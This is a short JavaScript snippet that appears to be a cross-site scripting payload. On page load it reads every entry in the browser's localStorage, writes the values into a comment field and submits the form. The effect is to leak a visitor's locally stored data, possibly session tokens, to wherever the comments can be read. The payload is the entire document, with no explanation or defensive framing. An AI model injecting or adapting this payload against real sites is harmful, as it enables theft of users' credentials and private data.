window.onload = function() {
    for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    var value = localStorage.getItem(key);
      var commentField = document.getElementById("c");
      commentField.value = value;
      document.getElementById("f").submit();
     }
    };
